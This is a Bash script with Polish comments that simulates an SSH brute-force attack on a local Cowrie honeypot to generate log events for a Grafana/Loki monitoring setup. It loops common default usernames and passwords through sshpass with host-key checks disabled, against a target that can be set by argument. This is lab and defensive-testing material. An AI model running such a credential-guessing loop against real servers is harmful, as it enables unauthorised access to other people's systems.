#!/bin/bash
# ═══════════════════════════════════════════════════════
#  Symulowany atak — brute force SSH na honeypot
#  Wersja uniwersalna (macOS, Linux, RPi)
# ═══════════════════════════════════════════════════════

TARGET=${1:-"localhost"}
PORT=${2:-"2222"}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
echo -e "${RED}║     SYMULOWANY ATAK — TYLKO TESTY        ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════╝${NC}"

# --- Sprawdzenie dostępności celu ---
echo -ne "${CYAN}[*] Sprawdzanie celu $TARGET:$PORT... ${NC}"
if ! nc -z -w3 "$TARGET" "$PORT" 2>/dev/null; then
    echo -e "${RED}NIEOSIĄGALNY${NC}"
    echo -e "${YELLOW}[!] Upewnij się, że kontenery działają (docker compose ps)${NC}"
    exit 1
fi
echo -e "${GREEN}OK${NC}"

# --- Sprawdzenie sshpass ---
if ! command -v sshpass &>/dev/null; then
    echo -e "${YELLOW}[!] Brakuje 'sshpass'. Próbuję zainstalować...${NC}"
    if [[ "$OSTYPE" == "darwin"* ]]; then
        brew install sshpass || { echo -e "${RED}Błąd instalacji brew. Zainstaluj sshpass ręcznie.${NC}"; exit 1; }
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        sudo apt update && sudo apt install -y sshpass || { echo -e "${RED}Błąd apt. Zainstaluj sshpass ręcznie.${NC}"; exit 1; }
    fi
fi

# --- Metoda: Brute Force (Automatyczny) ---
echo -e "${YELLOW}[URUCHAMIAM] Atak brute-force na SSH...${NC}"

PASSWORDS=("123456" "password" "admin" "root" "raspberry" "wrongpass1" "wrongpass2" "letmein")
USERS=("root" "admin" "pi" "ubuntu" "user")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo -ne "${CYAN}Próba:${NC} $user:$pass → "
        
        # Atak SSH (timeout 2s, ignorowanie kluczy)
        sshpass -p "$pass" ssh -p "$PORT" \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=2 \
            -o BatchMode=no \
            -o UserKnownHostsFile=/dev/null \
            "$user@$TARGET" "whoami" &>/dev/null
        
        # W Cowrie każda próba to event.
        echo -e "${GREEN}ZAREJESTROWANO${NC}"
        sleep 0.2
    done
done

echo ""
echo -e "${GREEN}[+] Symulacja zakończona.${NC}"
echo -e "${YELLOW}[MONITOROWANIE]${NC}"
echo "1. Grafana: http://localhost:3000 (Loki: {job='cowrie'})"
echo "2. Uptime Kuma: http://localhost:3001"
echo "3. Logi: ls -l ./logs/cowrie/cowrie.json"